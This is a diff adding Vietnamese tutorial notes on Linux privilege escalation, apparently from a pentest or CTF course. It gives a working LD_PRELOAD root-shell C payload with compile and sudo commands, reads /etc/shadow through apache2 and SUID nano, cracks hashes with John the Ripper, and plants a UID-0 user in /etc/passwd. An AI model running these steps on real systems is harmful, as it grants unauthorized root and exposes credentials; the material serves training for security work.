@@ -108,6 +108,7 @@ Một lựa chọn khác là sử dụng các script như LES (Linux Exploit Sug
 
 Hiểu mã nguồn TRƯỚC KHI chạy: Hãy chắc chắn ông hiểu cách mã khai thác hoạt động trước khi khởi chạy nó. Một số mã exploit có thể thay đổi hệ điều hành khiến chúng mất an toàn trong quá trình sử dụng tiếp theo hoặc tạo ra những thay đổi không thể đảo ngược, gây ra sự cố về sau.
 
+
 Trong Lab/CTF: Chuyện này không quá quan trọng.
 
 Trong Pentest thực tế: Đây là điều tuyệt đối cấm kỵ (No-nos).
@@ -115,3 +116,114 @@ Trong Pentest thực tế: Đây là điều tuyệt đối cấm kỵ (No-nos).
 Tương tác sau khi chạy: Một số exploit yêu cầu tương tác thêm sau khi chạy. Hãy đọc kỹ tất cả các bình luận (comments) và hướng dẫn đi kèm trong mã nguồn.
 
 Chuyển file: Ông có thể chuyển mã khai thác từ máy của mình sang máy mục tiêu bằng cách sử dụng module SimpleHTTPServer của Python (trên máy công) và lệnh wget (trên máy mục tiêu).
+
+
+**Leo thang Đặc quyền qua Lệnh Sudo**
+
+Lệnh sudo, theo mặc định, cho phép ông chạy một chương trình với đặc quyền của người dùng root. Trong một số điều kiện, quản trị viên hệ thống có thể cần cấp cho người dùng bình thường một chút linh hoạt về đặc quyền.
+
+Ví dụ: Một chuyên viên phân tích SOC cấp thấp (junior) có thể cần sử dụng Nmap thường xuyên nhưng không được phép có toàn quyền truy cập root. Trong tình huống này, quản trị viên có thể cho phép người dùng này chỉ chạy Nmap với quyền root, trong khi vẫn giữ mức đặc quyền bình thường cho các hoạt động khác trên hệ thống.
+
+Bất kỳ người dùng nào cũng có thể kiểm tra tình trạng quyền root hiện tại của mình bằng lệnh:
+sudo -l
+
+Nguồn tài nguyên vàng: GTFOBins là một trang web cực kỳ giá trị cung cấp thông tin về cách tận dụng bất kỳ chương trình nào mà ông có quyền sudo để leo thang đặc quyền.
+
+1. Tận dụng các chức năng của ứng dụng (Leverage application functions)
+Một số ứng dụng sẽ không có lỗ hổng (exploit) đã biết trong bối cảnh này. Một ứng dụng điển hình mà ông có thể thấy là máy chủ Apache2.
+
+Trong trường hợp này, chúng ta có thể sử dụng một "mẹo" (hack) để rò rỉ thông tin bằng cách tận dụng một chức năng của ứng dụng. Apache2 có một tùy chọn hỗ trợ tải các tệp cấu hình thay thế (-f: specify an alternate ServerConfigFile).
+
+Cách thực hiện:
+Việc tải tệp /etc/shadow (nơi lưu trữ mật khẩu đã hash của hệ thống) bằng tùy chọn này sẽ dẫn đến một thông báo lỗi. Điều thú vị là thông báo lỗi này thường bao gồm luôn dòng đầu tiên của tệp /etc/shadow, từ đó giúp ông "đọc lén" được dữ liệu nhạy cảm.
+
+2. Tận dụng LD_PRELOAD
+Trên một số hệ thống, ông có thể thấy tùy chọn môi trường LD_PRELOAD khi gõ sudo -l.
+
+LD_PRELOAD là một chức năng cho phép bất kỳ chương trình nào sử dụng các thư viện dùng chung (shared libraries). Nếu tùy chọn env_keep được bật cho LD_PRELOAD, chúng ta có thể tạo ra một thư viện dùng chung, thư viện này sẽ được tải và thực thi trước khi chương trình chính chạy.
+
+Lưu ý: LD_PRELOAD sẽ bị bỏ qua nếu ID người dùng thực sự khác với ID người dùng hiệu dụng (effective user ID).
+
+Các bước thực hiện:
+
+Kiểm tra LD_PRELOAD: Xem nó có xuất hiện trong phần env_keep khi chạy sudo -l không.
+
+Viết code C: Tạo một đoạn code đơn giản và biên dịch thành tệp đối tượng chia sẻ (.so).
+
+Chạy chương trình: Chạy bất kỳ lệnh nào ông có quyền sudo kèm theo tùy chọn LD_PRELOAD trỏ đến tệp .so của ông.
+
+Đoạn code C (shell.c):
+Đoạn code này đơn giản là sẽ mở ra một shell của root:
+
+C
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+Biên dịch:
+Sử dụng gcc để biến file .c thành file thư viện .so:
+
+Bash
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+Thực thi:
+Bây giờ, hãy dùng file .so này khi khởi chạy bất kỳ chương trình nào mà ông có quyền sudo (ví dụ: find, apache2, hay bất cứ thứ gì):
+
+Bash
+sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
+Kết quả: Một shell với quyền root sẽ được mở ra ngay lập tức!
+
+**Leo thang Đặc quyền qua SUID và SGID**
+Phần lớn việc kiểm soát đặc quyền trên Linux dựa vào việc quản lý tương tác giữa người dùng và tệp tin thông qua permissions (quyền hạn). Như ông đã biết, tệp tin có các quyền: đọc (read), ghi (write) và thực thi (execute). Thông thường, các quyền này được cấp dựa trên cấp độ đặc quyền của người dùng.
+
+Tuy nhiên, mọi thứ sẽ thay đổi với SUID (Set-user Identification) và SGID (Set-group Identification).
+
+SUID: Cho phép tệp được thực thi với cấp độ quyền hạn của chủ sở hữu tệp (thường là root).
+
+SGID: Cho phép tệp được thực thi với quyền của nhóm sở hữu tệp.
+
+Ông sẽ nhận biết các tệp này qua chữ "s" xuất hiện trong phần liệt kê quyền hạn thay vì chữ "x".
+
+1. Cách tìm các tệp SUID/SGID
+Sử dụng lệnh sau để liệt kê tất cả các tệp có bit SUID hoặc SGID được thiết lập:
+find / -type f -perm -04000 -ls 2>/dev/null
+
+2. Sử dụng GTFOBins
+Một thói quen tốt là so sánh danh sách các file tìm được với GTFOBins (https://gtfobins.github.io).
+
+Khi vào trang web, hãy nhấn vào nút SUID để lọc ra những tệp tin nhị phân (binaries) được biết là có thể khai thác được khi có bit SUID.
+
+Nghiên cứu trường hợp: Trình soạn thảo nano
+Giả sử trong danh sách tìm được, ông thấy nano có bit SUID. Thông thường, nano không cho ông quyền root ngay lập tức (không có "easy win"), nhưng nó cho phép ông đọc và chỉnh sửa bất kỳ tệp nào với quyền của chủ sở hữu (root).
+
+Từ đây, chúng ta có 2 hướng để leo thang đặc quyền:
+
+Hướng 1: Đọc tệp /etc/shadow và bẻ khóa mật khẩu
+Chạy lệnh: nano /etc/shadow. Lúc này ông sẽ thấy toàn bộ nội dung tệp chứa mã băm (hash) mật khẩu của hệ thống.
+
+Sử dụng công cụ unshadow để kết hợp /etc/shadow và /etc/passwd thành một tệp mà công cụ John the Ripper có thể hiểu được:
+unshadow passwd.txt shadow.txt > passwords.txt
+
+Dùng John the Ripper để bẻ khóa (nếu may mắn và wordlist đủ tốt, ông sẽ có mật khẩu cleartext).
+
+Hướng 2: Thêm người dùng mới vào /etc/passwd (Nhanh hơn)
+Cách này giúp ông tránh việc phải ngồi chờ bẻ khóa mật khẩu mệt mỏi. Ông sẽ tự tạo một người dùng có quyền root.
+
+Bước 1: Tạo mã băm mật khẩu trên máy tấn công (Kali Linux)
+Sử dụng công cụ openssl để tạo hash cho mật khẩu ông muốn (ví dụ mật khẩu là password123):
+openssl passwd -1 -salt [tên_muối] password123
+
+Bước 2: Thêm dòng mới vào /etc/passwd
+Dùng nano (đang có quyền SUID root) mở tệp /etc/passwd và thêm một dòng ở cuối theo định dạng:
+newroot:$1$salt$hash...:0:0:root:/root:/bin/bash
+(Lưu ý: Số 0:0 chính là UID và GID của root, biến người dùng này thành "trùm")
+
+Bước 3: Đăng nhập và chiếm quyền
+Sau khi lưu tệp, chỉ cần chuyển sang người dùng vừa tạo:
+su newroot
+Gõ mật khẩu ông đã thiết lập, và bùm... ông đã là root.
